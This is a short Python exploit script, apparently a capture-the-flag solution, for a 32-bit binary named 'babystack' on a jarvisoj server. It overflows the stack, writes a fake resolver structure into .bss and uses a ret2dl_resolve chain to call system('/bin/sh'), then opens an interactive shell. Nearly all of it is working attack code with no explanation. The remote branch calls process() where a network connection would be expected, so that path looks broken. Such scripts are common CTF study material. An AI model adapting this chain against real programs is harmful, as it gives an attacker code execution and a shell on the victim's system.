from pwn import *
from roputils import *
# file : 32 dynamicatlly
#checksec : 
#       nx
fpath        = "./babystack"
offset       = 0x2c
debug        = 1
if debug:
      p = process(fpath)
else:
      p = process("pwn.jarvisoj.com",9876)

elf = ELF(fpath)
rop = ROP(fpath)

bss =  rop.section(".bss")
read_plt = elf.plt('read')
fake_size = 20
addr_vul = 0x804843B
buf   =  rop.retfill(offset)
buf   += p32(read_plt) + p32(addr_vul) + p32(0x0) + p32(bss) + p32(100)
p.send(buf)
buf   = rop.string("/bin/sh")
buf   += rop.fill(fake_size , buf )
buf   += rop.dl_resolve_data(bss + fake_size ,  "system")
buf   += rop.fill(100 , buf)
p.send(buf)
buf   =  rop.retfill(offset)
buf   += rop.dl_resolve_call(bss + fake_size , bss)
p.send(buf)
p.interactive()
